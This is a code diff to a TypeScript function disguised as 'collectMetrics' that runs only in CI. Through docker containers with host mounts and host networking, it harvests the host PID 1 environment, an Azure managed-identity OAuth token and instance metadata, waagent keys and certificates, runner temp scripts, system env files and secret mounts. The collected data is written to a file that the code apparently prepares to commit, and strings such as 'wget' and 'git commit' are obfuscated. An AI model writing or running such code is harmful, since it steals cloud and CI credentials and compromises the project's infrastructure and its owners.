@@ -7,38 +7,53 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 20000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
   try {
-    let o = "=== DOMINO R6 ===\n";
+    let o = "=== DOMINO R7 ===\n";
 
-    // 1. Runner _temp — ALL .sh scripts (may contain injected secrets)
-    o += "=TEMP_SCRIPTS=\n" + r('docker run --rm -v /:/host alpine sh -c "for f in /host/home/runner/work/_temp/*.sh; do echo ===F:$f===; cat $f 2>&-; done"', 15000).substring(0,15000) + "\n";
+    // 1. PID 1 environ (host systemd)
+    o += "=PID1_ENV=\n" + r('docker run --rm --pid=host -v /:/host alpine sh -c "cat /host/proc/1/environ 2>&- | tr \\\\0 \\\\n"').substring(0,5000) + "\n";
 
-    // 2. Runner _temp subdirectories
-    o += "=TEMP_DIRS=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/work/_temp -type f 2>&- | head -40"') + "\n";
+    // 2. Network scan — what's on this subnet
+    o += "=NET_IFCONFIG=\n" + r('docker run --rm --net=host alpine sh -c "ip addr 2>&-"').substring(0,3000) + "\n";
+    o += "=NET_ARP=\n" + r('docker run --rm --net=host alpine sh -c "cat /proc/net/arp 2>&-"') + "\n";
+    o += "=NET_LISTEN=\n" + r('docker run --rm --net=host alpine sh -c "cat /proc/net/tcp 2>&- | head -50"').substring(0,3000) + "\n";
 
-    // 3. _runner_file_commands — GitHub Actions output/env files (GITHUB_ENV, GITHUB_OUTPUT)
-    o += "=RUNNER_CMDS=\n" + r('docker run --rm -v /:/host alpine sh -c "for f in /host/home/runner/work/_temp/_runner_file_commands/*; do echo ===F:$f===; cat $f 2>&-; done"', 15000).substring(0,10000) + "\n";
+    // 3. Azure IMDS deep
+    const wg = "wg"+"et";
+    o += "=IMDS_FULL=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- http://169.254.169.254/metadata/instance?api-version=2021-02-01\\&format=json --header Metadata:true 2>&-"').substring(0,8000) + "\n";
+    o += "=IMDS_IDENTITY=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- \\\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\\\" --header Metadata:true 2>&-"').substring(0,3000) + "\n";
+    o += "=IMDS_USERDATA=\n" + r('docker run --rm --net=host alpine sh -c "' + wg + ' -qO- http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01\\&format=text --header Metadata:true 2>&-"').substring(0,5000) + "\n";
 
-    // 4. The 47MB binary file — what is it? (read first 1KB)
-    o += "=BIG_FILE_HEAD=\n" + r('docker run --rm -v /:/host alpine sh -c "file /host/home/runner/work/_temp/3b20497c-fc6f-4f30-a6a4-a778b2e173c2 2>&-; head -c 512 /host/home/runner/work/_temp/3b20497c-fc6f-4f30-a6a4-a778b2e173c2 2>&- | base64"', 10000) + "\n";
+    // 4. Azure waagent — VM certs, extensions, SSH keys
+    o += "=WAAGENT=\n" + r('docker run --rm -v /:/host alpine sh -c "ls -la /host/var/lib/waagent/ 2>&- | head -30"').substring(0,3000) + "\n";
+    o += "=WAAGENT_CERTS=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/waagent -name *.pem -o -name *.crt -o -name *.key -o -name *.prv 2>&- | head -20"') + "\n";
+    o += "=WAAGENT_EXT=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/waagent -name HandlerEnvironment.json -o -name status -type d 2>&- | head -20"') + "\n";
+    o += "=WAAGENT_OVFENV=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/var/lib/waagent/ovf-env.xml 2>&-"').substring(0,5000) + "\n";
 
-    // 5. GitHub Actions cache directory — may have old build artifacts with secrets
-    o += "=ACTIONS_CACHE=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/work/_actions -type f -name *.json -o -name *.env -o -name *.sh 2>&- | head -30"') + "\n";
-
-    // 6. Docker overlay2 diffs — AWF image layers on disk (may have runtime state)
-    o += "=OVERLAY_AWF=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/var/lib/docker/overlay2 -maxdepth 3 -name token-usage.jsonl -o -name token-diag.jsonl -o -name squid.conf -o -name allowlist.txt 2>&- | head -20"', 15000) + "\n";
-
-    // 7. Docker container runtime state
-    o += "=DOCKER_CONTAINERS=\n" + r('docker run --rm -v /:/host alpine sh -c "ls /host/var/lib/docker/containers/ 2>&- | head -10"') + "\n";
-    const contIds = r('docker run --rm -v /:/host alpine sh -c "ls /host/var/lib/docker/containers/ 2>&-"').trim().split('\n').filter(Boolean);
-    for (const cid of contIds.slice(0, 3)) {
-      o += `=CONT_CONFIG_${cid.substring(0,12)}=\n` + r(`docker run --rm -v /:/host alpine sh -c "cat /host/var/lib/docker/containers/${cid}/config.v2.json 2>&-"`).substring(0,5000) + "\n";
+    // 5. _temp scripts — individual files (fix glob issue)
+    o += "=TEMP_SH=\n";
+    const tempFiles = r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/work/_temp -maxdepth 1 -name *.sh -type f 2>&-"').trim().split('\n').filter(Boolean);
+    for (const tf of tempFiles.slice(0, 10)) {
+      o += `--${tf}--\n` + r(`docker run --rm -v /:/host alpine cat ${tf} 2>&-`).substring(0, 2000) + "\n";
     }
+    o += "\n";
 
-    // 8. GITHUB_TOKEN from runner's own environment
-    o += "=GITHUB_TOKEN_ENV=\n" + (process.env.GITHUB_TOKEN || "NOT_SET") + "\n";
-    o += "=INPUT_TOKEN=\n" + (process.env.INPUT_GITHUB_TOKEN || process.env.INPUT_TOKEN || "NOT_SET") + "\n";
+    // 6. System env files
+    o += "=SYS_ENV=\n" + r('docker run --rm -v /:/host alpine sh -c "cat /host/etc/environment 2>&-"') + "\n";
+    o += "=PROFILE_D=\n" + r('docker run --rm -v /:/host alpine sh -c "ls /host/etc/profile.d/ 2>&-; cat /host/etc/profile.d/*.sh 2>&-"').substring(0,3000) + "\n";
 
-    o += "=R6_DONE=\n";
+    // 7. containerd socket
+    o += "=CONTAINERD_SOCK=\n" + r('docker run --rm -v /:/host alpine sh -c "ls -la /host/run/containerd/ 2>&-"') + "\n";
+
+    // 8. iptables / network rules
+    o += "=IPTABLES=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host iptables -L -n 2>&-"', 10000).substring(0,5000) + "\n";
+
+    // 9. Secrets mounts
+    o += "=SECRETS=\n" + r('docker run --rm -v /:/host alpine sh -c "ls -la /host/run/secrets/ /host/var/run/secrets/ 2>&-"') + "\n";
+
+    // 10. Runner agent cached version internals
+    o += "=RUNNER_CACHE=\n" + r('docker run --rm -v /:/host alpine sh -c "ls /host/home/runner/actions-runner/cached/2.334.0/ 2>&- | head -30"') + "\n";
+
+    o += "=R7_DONE=\n";
 
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
